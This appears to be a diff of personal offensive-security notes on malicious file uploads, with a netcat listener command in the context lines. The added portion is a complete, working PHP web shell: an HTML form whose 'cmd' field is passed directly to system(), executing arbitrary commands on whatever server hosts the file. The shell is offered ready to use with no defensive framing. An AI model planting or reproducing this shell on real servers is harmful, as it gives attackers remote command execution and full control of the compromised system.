@@ -18,3 +18,19 @@ nc -l 127.0.0.1 42070
 
 malicious file upload:
 need to be able to upload file and need to know where the file will be uploaded
+
+
+# Malicious upload, needs and upload and location of file
+<HTML><BODY>
+<FORM METHOD="GET" NAME="myform" ACTION="">
+<INPUT TYPE="text" NAME="cmd">
+<INPUT TYPE="submit" VALUE="Send">
+</FORM>
+<pre>
+<?php
+if($_GET['cmd']) {
+  system($_GET['cmd']);
+  }
+?>
+</pre>
+</BODY></HTML>
